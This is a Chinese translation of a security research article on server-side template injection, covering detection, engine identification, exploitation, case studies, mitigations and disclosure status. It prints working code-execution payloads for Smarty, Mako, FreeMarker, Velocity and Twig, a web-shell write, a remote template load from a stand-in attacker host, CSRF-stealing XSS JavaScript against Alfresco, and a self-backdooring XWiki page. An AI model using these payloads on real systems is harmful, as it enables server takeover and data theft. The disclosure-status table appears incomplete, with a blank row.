# Server-Side Template Injection（服务器端模板注入）

> 作者：**James Kettle**（研究总监）  
> Twitter：[@albinowax](https://twitter.com/albinowax)

- **发布时间：** 2015 年 8 月 5 日（星期三）19:00 UTC
- **更新日期：** 2025 年 9 月 3 日（星期三）07:38 UTC

模板引擎被 Web 应用程序广泛用于通过网页和电子邮件呈现动态数据。以不安全的方式将用户输入嵌入模板会导致[服务器端模板注入](/web-security/server-side-template-injection)，这是一种经常出现的关键漏洞，极易被误认为是[跨站脚本](/web-security/cross-site-scripting)（XSS），或者完全被忽略。与 XSS 不同，模板注入可以直接用于攻击 Web 服务器的内部，并且通常能够获得远程代码执行（RCE），使每个易受攻击的应用程序都成为一个潜在的跳板。

模板注入既可能由开发人员错误引起，也可能通过有意暴露模板以提供丰富功能而产生，如 Wiki、博客、营销应用程序和内容管理系统常见的情况。有意的模板注入是一种非常常见的用例，因此许多模板引擎为此目的提供了"沙箱"模式。本文定义了一种检测和利用模板注入的方法论，并展示了如何将其应用于为两个广泛部署的企业 Web 应用程序构建 RCE 零日漏洞。本文还为五种最流行的模板引擎演示了通用利用方法，包括逃逸那些全部目的就是以安全方式处理用户提交模板的沙箱。

如果您想要一篇不那么枯燥的研究叙述，您可能更愿意观看[我在 Black Hat USA 上关于此主题的演讲](https://www.youtube.com/watch?v=3cT0uE7Y87s)。本研究成果也可作为[可打印的白皮书](/knowledgebase/papers/serversidetemplateinjection.pdf)获取，您可以在我们的 [Web Security Academy](https://portswigger.net/web-security/server-side-template-injection) 中找到包含交互式实验的概述。

## 引言

Web 应用程序经常使用模板系统（如 [Twig](http://twig.sensiolabs.org/) 和 [FreeMarker](http://freemarker.org/)）在网页和电子邮件中嵌入动态内容。当用户输入以不安全的方式嵌入模板时，就会发生模板注入。考虑一个发送批量邮件的营销应用程序，它使用 Twig 模板按名称问候收件人。如果名称仅作为数据传入模板，如下例所示，一切正常：

```php
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```

但是，如果允许用户自定义这些电子邮件，问题就来了：

```php
$output = $twig->render($_GET['custom_email'], array("first_name" => $user.first_name) );
```

在此示例中，用户通过 `custom_email` GET 参数控制模板本身的内容，而不是传入其中的值。这导致了一个难以忽视的 XSS 漏洞。然而，XSS 只是一个更微妙、更严重漏洞的症状。这段代码实际上暴露了一个广阔但容易被忽视的攻击面。以下两条问候消息的输出暗示了一个服务器端漏洞：

```
custom_email={{7*7}}

49
```

```
custom_email={{self}}

Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string
```

我们在这里看到的基本上是沙箱内的服务器端代码执行。根据所使用的模板引擎，可能有可能逃逸沙箱并执行任意代码。

此漏洞通常源于开发人员有意让用户提交或编辑模板——某些模板引擎为此目的提供了安全模式。这远非营销应用程序特有——任何支持高级用户提供标记的功能都可能存在漏洞，包括 Wiki 页面、评论，甚至评论。模板注入也可能偶然发生，即用户输入被直接拼接到模板中。这似乎有点反直觉，但它相当于在编写不当的预编译语句中出现的 [SQL 注入](/web-security/sql-injection)漏洞，这种情况相对常见。此外，无意的模板注入极容易被忽略，因为通常不会有任何可见的线索。与所有基于输入的漏洞一样，输入可能来自带外来源。例如，它可能作为本地文件包含（LFI）的一种变体出现，可通过经典的 LFI 技术（如嵌入日志文件中的代码、[会话文件](http://www.ush.it/2008/07/09/local-file-inclusion-lfi-of-session-files-to-root-escalation/)或 [`/proc/self/env`](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)）加以利用。

"服务器端"限定词用于区分此漏洞与客户端模板库（如 jQuery 和 KnockoutJS 提供的库）中的漏洞。客户端模板注入通常可以被滥用于 XSS 攻击，正如 [Mario Heiderich 详细描述的那样](https://code.google.com/p/mustache-security/)。本文仅涵盖攻击服务器端模板，目标是获得任意代码执行。

## 模板注入方法论

根据我审计一系列易受攻击的应用程序和模板引擎的经验，我定义了以下高层方法论来捕获一个高效的攻击过程：

![方法论示意图](/cms/images/migration/blog/pretty-methodology-diagram.png)

### 检测

此漏洞可能出现在两种不同的上下文中，每种上下文都需要自己的检测方法：

#### 1. 纯文本上下文

大多数模板语言支持自由形式的"文本"上下文，您可以直接输入 HTML。它通常以下列方式之一出现：

```
smarty=Hello {user.name}
Hello user1
```

```
freemarker=Hello ${username}
Hello newuser
```

```
any=<b>Hello</b>
<b>Hello<b>
```

这通常会导致 XSS，因此 XSS 的存在可以作为更全面的模板注入探测的线索。模板语言使用的语法明确选择不与普通 HTML 中使用的字符冲突，因此手动的黑盒安全评估很容易完全忽略模板注入。为了检测它，我们需要通过嵌入语句来调用模板引擎。模板语言数量庞大，但其中许多共享基本的语法特征。我们可以利用这一点，通过发送通用的、与模板无关的载荷，使用基本操作来通过单个 HTTP 请求检测多个模板引擎：

```
smarty=Hello ${7*7}
Hello 49

freemarker=Hello ${7*7}
Hello 49
```

#### 2. 代码上下文

用户输入也可能被放置在模板语句内部，通常作为变量名：

```
personal_greeting=username
Hello user01
```

这种变体在评估期间更容易被忽略，因为它不会导致明显的 XSS，并且几乎与简单的哈希映射查找无法区分。将值从 `username` 更改通常会导致空白结果或应用程序报错。它可以通过以下方式稳健地检测：首先验证参数没有直接的 XSS，然后跳出模板语句并在其后注入 HTML 标签：

```
personal_greeting=username<tag>
Hello

personal_greeting=username}}<tag>
Hello user01 <tag>
```

### 识别

检测到模板注入后，下一步是识别正在使用的模板引擎。这一步有时非常简单，只需提交无效语法即可，因为模板引擎可能会在由此产生的错误消息中标识自身。然而，当错误消息被抑制时，这种技术就失效了，并且不太适合自动化。我们已经在 Burp Suite 中通过使用特定语言载荷的决策树实现了自动化。绿色和红色箭头分别代表"成功"和"失败"响应。在某些情况下，单个载荷可以有多个不同的成功响应——例如，探测载荷 `{{7*'7'}}` 在 Twig 中会产生 `49`，在 Jinja2 中会产生 `7777777`，如果没有模板语言在使用，则两者都不会产生。

![模板决策树](https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png)

### 利用

#### 阅读

在发现模板注入并识别模板引擎之后的第一步是阅读文档。这一步的重要性不应被低估；后续的一个零日漏洞完全是纯粹通过仔细研读文档得出的。关键关注领域包括：

- "For Template Authors"（给模板作者）部分，涵盖基本语法。
- "Security Considerations"（安全注意事项）——您正在测试的应用程序的开发人员很可能没有阅读过这一部分，它可能包含一些有用的提示。
- 内置方法、函数、过滤器和变量的列表。
- 扩展/插件的列表——有些可能默认启用。

#### 探索

假设没有现成的利用方法，下一步是探索环境以确切了解您可以访问什么。您可以期望找到模板引擎提供的默认对象，以及开发人员传入模板的应用程序特定对象。许多模板系统暴露一个包含范围内所有内容的"self"或命名空间对象，以及一种列出对象属性和方法的惯用方式。

如果没有内置的 self 对象，您将不得不暴力破解变量名。我通过爬取 GitHub 获取 PHP 项目中使用的 GET/POST 变量名创建了一个字典，并通过 [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) 和 Burp Intruder 的字典集公开发布了它。

开发人员提供的对象特别可能包含敏感信息，并且可能在应用程序内的不同模板之间有所不同，因此理想情况下应对每个不同的模板单独应用此过程。

#### 攻击

在这一点上，您应该对可用的攻击面有了清晰的了解，并能够继续进行传统的安全审计技术，审查每个函数是否存在可利用的漏洞。重要的是在更广泛的应用程序上下文中处理这个问题——某些函数可用于利用应用程序特定的功能。接下来的示例将使用模板注入来触发任意对象创建、任意文件读/写、远程文件包含、[信息泄露](/web-security/information-disclosure)和权限提升漏洞。

## 利用开发

我审计了一系列流行的模板引擎，以在实践中展示利用方法论，并证明此问题的严重性。这些发现可能看起来像是模板引擎本身的缺陷，但除非引擎将自己定位为适合用户提交的模板，否则防止模板注入的责任最终在于 Web 应用程序开发人员。

有时，只需阅读三十秒的文档就足以获得 RCE。例如，利用未沙箱化的 Smarty 非常简单：

```smarty
{php}echo `id`;{/php}
```

Mako 同样易于利用：

```mako
<%
import os
x=os.popen('id').read()
%>
${x}
```

然而，许多模板引擎试图通过限制其执行任意代码的能力来防止应用程序逻辑渗入模板。其他模板引擎则明确尝试限制和沙箱模板，作为一种安全措施，以实现安全处理不可信输入。在这些措施之间，开发一个模板后门可能是一个相当具有挑战性的过程。

## FreeMarker

FreeMarker 是最流行的 Java 模板语言之一，也是我见过最常暴露给用户的语言。这使得官方网站解释允许用户提供模板的危险性变得令人惊讶：

> **23. 我可以允许用户上传模板吗？安全影响是什么？**
>
> 一般来说你不应该允许这样做，除非这些用户是系统管理员或其他受信任的人员。将模板视为源代码的一部分，就像 `*.java` 文件一样。如果你仍然想允许用户上传模板，以下是你需要考虑的事项：
>
> —— http://freemarker.org/docs/app_faq.html#faq_template_uploading_security

在一些较低风险（如拒绝服务）之后，我们发现了这个：

> `new` 内置指令（`Configuration.setNewBuiltinClassResolver`，`Environment.setNewBuiltinClassResolver`）：它在模板中像 `"com.example.SomeClass"?new()` 这样使用，对于部分用 Java 实现的 FTL 库很重要，但在普通模板中不应该需要。虽然 `new` 不会实例化不是 `TemplateModel` 的类，但 FreeMarker 包含一个可以用来创建任意 Java 对象的 `TemplateModel` 类。其他"危险的" `TemplateModel` 可能存在于您的类路径中。此外，即使一个类没有实现 `TemplateModel`，它的静态初始化也将被执行。为了避免这些，您应该使用一个限制可访问类的 `TemplateClassResolver`（可能基于哪个模板请求它们），例如 `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`。

这个警告有点隐晦，但它确实表明 `new` 内置指令可能提供了一条有希望的利用途径。让我们看一下关于 `new` 的文档：

> 这个内置指令可能存在安全问题，因为模板作者可以创建任意 Java 对象然后使用它们，只要它们实现了 `TemplateModel`。此外，模板作者可以触发即使没有实现 `TemplateModel` 的类的静态初始化。[略] 如果你允许不太受信任的用户上传模板，你绝对应该研究这个话题。
>
> —— http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new

有没有任何实现了 `TemplateModel` 的有用类？让我们看看 JavaDoc：

![TemplateModel 实现类](/cms/images/migration/blog/3-implementing-classes.png)

其中一个类名很突出——`Execute`。

详细信息证实了它正如您所期望的那样——接受输入并执行它：

> `public class Execute implements TemplateMethodModel`
>
> 为 FreeMarker 提供执行外部命令的能力。将 fork 一个进程，并将该进程发送到 stdout 的任何内容内联到模板中。

使用它非常简单：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)
```

这个载荷稍后会派上用场。

## Velocity

[Velocity](https://velocity.apache.org/) 是另一种流行的 Java 模板语言，利用起来更加棘手。没有"安全注意事项"页面来帮助指出最危险的函数，也没有明显的默认变量列表。以下截图显示了使用 Burp Intruder 工具暴力破解变量名的过程，左侧"payload"列中是变量名，右侧是服务器输出。

![变量暴力破解](/cms/images/migration/blog/1-variable-bruteforce.png)

高亮的 `class` 变量看起来特别有希望，因为它返回一个通用的 Object。搜索它引导我们找到 https://velocity.apache.org/tools/releases/2.0/summary.html：

> **ClassTool**：用于在模板中使用 Java 反射的工具  
> 默认键：`$class`

一个方法和一个属性很突出：

| 方法/属性 | 描述 |
|---|---|
| `$class.inspect(class/object/string)` | 返回一个新的 ClassTool 实例，检查指定的类或对象 |
| `$class.type` | 返回正在检查的实际 Class |

—— https://velocity.apache.org/tools/releases/2.0/summary.html

换句话说，我们可以将 `$class.inspect` 与 `$class.type` 链式调用来获得对任意对象的引用。然后我们可以使用 [`Runtime.exec()`](https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec%28java.lang.String%29) 在目标系统上执行任意 shell 命令。这可以通过以下模板确认，该模板旨在引起明显的时间延迟：

```velocity
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
[5 second time delay]
0
```

获取 shell 命令的输出有点棘手（毕竟这是 Java）：

```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

tomcat7
```

## Smarty

[Smarty](http://www.smarty.net/) 是最流行的 PHP 模板语言之一，并为不可信模板执行提供了[安全模式](http://www.smarty.net/docs/en/advanced.features.tpl#advanced.features.security)。这强制实施了一个安全 PHP 函数的白名单，因此模板不能直接调用 `system()`。然而，它并不阻止我们调用我们能够获得引用的任何类上的方法。文档显示，`$smarty` 内置变量可用于访问各种环境变量，包括 `$SCRIPT_NAME` 处的当前文件位置。变量名暴力破解很快揭示了 self 对象，它是对当前模板的引用。关于这一点的文档很少，但所有代码都在 GitHub 上。[`getStreamVariable`](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385) 方法非常宝贵：

![getStreamVariable 方法](/cms/images/migration/blog/0-getstreamvariable-method.png)

`getStreamVariable` 方法可用于读取服务器具有读写权限的任何文件：

```smarty
{self::getStreamVariable("file:///proc/self/loginuid")}

1000

{self::getStreamVariable($SCRIPT_NAME)}

<?php
define("SMARTY_DIR",'/usr/share/php/Smarty/');
require_once(SMARTY_DIR.'Smarty.class.php');
...
```

此外，我们可以调用任意静态方法。Smarty 暴露了一系列有价值的静态类，包括 [`Smarty_Internal_Write_File`](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16)，它有以下方法：

```php
public function writeFile($_filepath, $_contents, Smarty $smarty)
```

这个函数旨在创建和覆盖任意文件，因此可以轻松用于在 webroot 内创建 PHP 后门，授予我们几乎完全控制服务器的能力。有一个问题——第三个参数有一个 `Smarty` 类型提示，因此它会拒绝任何非 `Smarty` 类型的输入。这意味着我们需要获得一个 `Smarty` 对象的引用。

进一步的代码审查显示，[`self::clearConfig()`](https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L372) 方法是合适的：

```php
/**
 * Deassigns a single or all config variables
 *
 * @param  string $varname variable name or null
 *
 * @return Smarty_Internal_Data current Smarty_Internal_Data (or Smarty or Smarty_Internal_Template) instance for chaining
 */
public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}
```

最终的利用代码，旨在用后门覆盖易受攻击的文件，看起来像：

```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Twig

Twig 是另一种流行的 PHP 模板语言。默认情况下，它具有类似于 Smarty 安全模式的限制，但有两个重要的额外限制——不能调用静态方法，所有函数的返回值都被强制转换为字符串。这意味着我们不能像在 Smarty 中使用 `self::clearConfig()` 那样使用函数来获得对象引用。与 Smarty 不同，Twig 记录了它的 self 对象（`_self`），因此我们不需要暴力破解任何变量名。

`_self` 对象不包含任何有用的方法，但确实有一个 `env` 属性，它引用一个 [`Twig_Environment`](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php) 对象，这看起来更有希望。`Twig_Environment` 上的 [`setCache`](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L233) 方法可用于更改 Twig 尝试加载和执行编译模板（PHP 文件）的位置。因此，一个明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：

```twig
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

然而，现代版本的 PHP 默认通过 [`allow_url_include`](http://php.net/manual/en/filesystem.configuration.php) 禁用了远程文件包含，因此这种方法不太有用。

进一步的代码审查在第 874 行 [`getFilter`](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874) 方法中发现了一个对危险的 [`call_user_func`](http://php.net/manual/en/function.call-user-func.php) 函数的调用。只要我们控制其参数，它就可以用于调用任意 PHP 函数。

```php
public function getFilter($name)
{
        [snip]
        foreach ($this->filterCallbacks as $callback) {
            if (false !== $filter = call_user_func($callback, $name)) {
                return $filter;
            }
        }
        return false;
}

public function registerUndefinedFilterCallback($callable)
{
        $this->filterCallbacks[] = $callable;
}
```

执行任意 shell 命令因此只需将 `exec` 注册为过滤器回调，然后调用 `getFilter`：

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)
```

## Twig（沙箱化）

Twig 的沙箱引入了额外的限制。它禁用属性检索并添加了函数和方法调用的白名单，因此默认情况下我们完全不能调用任何函数，即使是开发者提供的对象上的方法。从表面上看，这使得利用几乎不可能。不幸的是，[源代码](https://github.com/twigphp/Twig/blob/d63ac2088e8d30137cde10f310ab89b06dab916b/lib/Twig/Sandbox/SecurityPolicy.php#L83)讲述了不同的故事：

```php
public function checkMethodAllowed($obj, $method)
{
    if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {
        return true;
    }
}
```

由于这段代码，我们可以在实现了 `Twig_TemplateInterface` 的任何对象上调用任何方法，这恰好包括 `_self`。`_self` 对象的 [`displayBlock`](https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Template.php#L139) 方法提供了一种高层 gadget：

```php
public function displayBlock($name, array $context, array $blocks = array(), $useBlocks = true)
{
    $name = (string) $name;
    if ($useBlocks && isset($blocks[$name])) {
        $template = $blocks[$name][0];
        $block = $blocks[$name][1];
    } elseif (isset($this->blocks[$name])) {
        $template = $this->blocks[$name][0];
        $block = $this->blocks[$name][1];
    } else {
        $template = null;
        $block = null;
    }
    if (null !== $template) {
        try {
            $template->$block($context, $blocks);
        } catch (Twig_Error $e) {
```

`$template->$block($context, $blocks);` 调用可以被滥用以绕过函数白名单，并在用户能够获得引用的任何对象上调用任何方法。以下代码将在 `userObject` 对象上调用 `vulnerableMethod` 方法，不带参数。

```twig
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```

这不能用于利用前面使用的 `Twig_Environment->getFilter()` 方法，因为无法获得对 `Environment` 对象的引用。然而，它确实意味着我们可以在开发者传入模板的任何对象上调用方法——可以迭代 `_context` 对象的属性以查看是否有任何有用的东西在作用域内。后面的 XWiki 示例说明了利用开发者提供的类。

## 案例研究：Alfresco

[Alfresco](https://www.alfresco.com/) 是一个面向企业用户的内容管理系统（CMS）。低权限用户可以将在评论系统中的存储型 XSS 漏洞与 FreeMarker 模板注入链式结合，在 Web 服务器上获得 shell。先前创建的 FreeMarker 载荷可以直接使用而无需修改，但我将其扩展为一个经典后门，执行查询字符串内容作为 shell 命令：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}
```

低权限用户没有编辑模板的权限，但存储型 XSS 漏洞可用于强制管理员为我们安装后门。我注入了以下 JavaScript 来发起此攻击：

```javascript
tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];
tok = decodeURIComponent(tok)
do_csrf = new XMLHttpRequest();
do_csrf.open("POST","http://"+document.domain+":8080/share/proxy/alfresco/api/node/workspace/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor",false);
do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');
do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);
do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(url.getArgs())}","prop_cm_description":""}');
```

模板的 GUID 值在不同安装中可能不同，但低权限用户通过"Data Dictionary"很容易看到。此外，管理用户在其可采取的操作上受到相当大的限制，不像其他应用程序中管理员被有意授予对 Web 服务器的完全控制。

请注意，根据 Alfresco 自己的文档，SELinux 对由此产生的 shell 不做任何限制：

> 如果您使用安装向导安装 Alfresco，安装中包含的 alfresco.sh 脚本会在整个系统中禁用 Security-Enhanced Linux (SELinux) 功能。

## 案例研究：XWiki Enterprise

[XWiki Enterprise](http://www.xwiki.org/) 是一个功能丰富的专业 Wiki。在默认配置中，匿名用户可以在其上注册账户并编辑 Wiki 页面，页面中可以包含嵌入的 Velocity 模板代码。这使其成为模板注入的绝佳目标。然而，先前创建的通用 Velocity 载荷将不起作用，因为 `$class` 辅助对象不可用。

XWiki 对 Velocity 有如下说明：

> 它不需要特殊权限，因为它在沙箱中运行，只能访问少数安全对象，并且每个 API 调用都会检查 Wiki 中配置的权限，禁止访问当前用户不应被允许检索/执行的资源或操作。其他脚本语言要求编写脚本的用户拥有编程权限才能执行它们，但除了这个初始前提之外，允许访问服务器上的所有资源。
> ...
> 如果没有编程权限，就不可能实例化新对象，除了字面量和 XWiki API 安全提供的对象。然而，如果正确遵循"XWiki 方式"，XWiki API 足够强大，可以允许安全地开发广泛的应用程序。
> ...
> 查看包含需要编程权限的脚本的页面时不需要编程权限，权限仅在保存时需要
>
> —— http://platform.xwiki.org/xwiki/bin/view/DevGuide/Scripting

换句话说，XWiki 不仅支持 Velocity，还支持未沙箱化的 Groovy 和 Python 脚本。然而，这些限制为具有编程权限的用户。这很好知道，因为它将权限提升转化为任意代码执行。由于我们只能使用 Velocity，我们被限制在 [XWiki API](http://platform.xwiki.org/xwiki/bin/view/ScriptingDocumentation/) 之内。

`$doc` 类有一些非常有趣的方法——敏锐的读者可能能够从以下内容中识别出一个隐含的漏洞：

Wiki 页面的内容作者是最后编辑它的用户。存在不同的 `save` 和 `saveAsAuthor` 方法意味着 `save` 方法不是以作者身份保存，而是以当前正在查看页面的用户身份保存。换句话说，低权限用户可以创建一个 Wiki 页面，当具有编程权限的用户查看时，该页面会静默地修改自身并以该权限保存修改。为了注入以下 Python 后门：

```python
{{python}}from subprocess import check_output
q = request.get('q') or 'true'
q = q.split(' ')
print ''+check_output(q)+''
{{/python}}
```

我们只需要将其包装在一些代码中，以获取经过的管理员的权限：

```velocity
innocent content
{{velocity}}
#if( $doc.hasAccessLevel("programming") )
    $doc.setContent("
        innocent content
        {{python}}from subprocess import check_output
        q = request.get('q') or 'true'
        q = q.split(' ')
        print ''+check_output(q)+''
        {{/python}}
    ")
    $doc.save()
#end
{{/velocity}}
```

一旦具有编程权限的用户查看包含此内容的 Wiki 页面，它将自我植入后门。随后查看该页面的任何用户都可以使用它来执行任意 shell 命令：

![XWiki 利用](/cms/images/migration/blog/5-exploit.png)

虽然我选择了利用 `$doc.save`，但它远非唯一有希望的 API 方法。其他可能有用的方法包括 `$xwiki.getURLContent("http://internal-server.net")`、`$request.getCookie("password").getValue()` 和 `$services.csrf.getToken()`。

## 缓解措施——安全地使用模板

如果用户提供的模板是业务需求，应该如何实现？我们已经看到正则表达式不是有效的防御手段，解析器级别的沙箱容易出错。风险最低的方法是使用一个简单的模板引擎，如 Mustache 或 Python 的 Template。MediaWiki 采取的方法是在沙箱化的 Lua 环境中执行用户代码，其中潜在危险的模块和函数已被完全移除。考虑到没有人成功入侵 Wikipedia，这种策略似乎运行良好。在 Ruby 等语言中，可能可以通过猴子补丁来模拟这种方法。

另一种补充方法是承认任意代码执行是不可避免的，并将其隔离在锁定的 Docker 容器中。通过使用能力下降、只读文件系统和内核加固，有可能构建一个难以逃逸的"安全"环境。

## 问题状态

我不认为针对 FreeMarker、Jade、Velocity 和未沙箱化 Twig 的利用是这些语言的漏洞，就像 SQL 注入的可能性不是 MYSQL 的错一样。下表显示了本文中披露的漏洞的当前状态。

| 软件 | 状态 |
|---|---|

| XWiki | 无可用修复——XWiki 开发者对此是否为漏洞未达成共识 |
| Smarty 沙箱 | 在 3.1.24 中修复 |
| CodePen | 已修复 |

## 结论

模板注入只有明确寻找它的审计人员才能发现，并且可能错误地表现为低严重性，直到投入资源评估模板引擎的安全态势。这解释了为什么模板注入迄今为止相对不为人知，其在实际环境中的普遍性仍有待确定。

模板引擎是服务器端沙箱。因此，允许不可信用户编辑模板会引入一系列严重风险，这些风险可能在模板系统的文档中明确或不明确。许多旨在防止模板造成危害的现代技术目前尚不成熟，不应被依赖，除非作为纵深防御措施。当模板注入发生时，无论它是有意的还是无意的，它通常是一个关键漏洞，暴露了 Web 应用程序、底层 Web 服务器和相邻网络服务。

通过全面记录此问题，并通过 Burp Suite 发布自动检测，我们希望能提高对其的认识并显著减少其普遍性。
